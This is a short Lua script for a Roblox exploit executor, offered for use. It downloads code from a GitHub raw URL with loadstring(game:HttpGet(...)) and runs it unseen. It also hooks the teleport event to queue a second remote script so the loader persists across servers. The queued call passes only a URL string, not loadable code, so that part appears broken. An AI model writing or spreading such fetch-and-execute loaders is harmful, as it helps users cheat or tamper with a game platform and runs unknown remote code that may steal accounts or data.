repeat
    task.wait()
until game:IsLoaded()
loadstring(
    game:HttpGet(
        'https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/loadstring'
    )
)()

local QueueOnTeleport = queue_on_teleport
    or queueonteleport
    or (syn and syn.queue_on_teleport)

local Players = game:GetService('Players')
repeat
    task.wait()
until Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer

LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.InProgress then
        QueueOnTeleport(
            "https://raw.githubusercontent.com/ThemPrices/themprices.github.io/refs/heads/main/kjk.lua"
        )
    end
end)
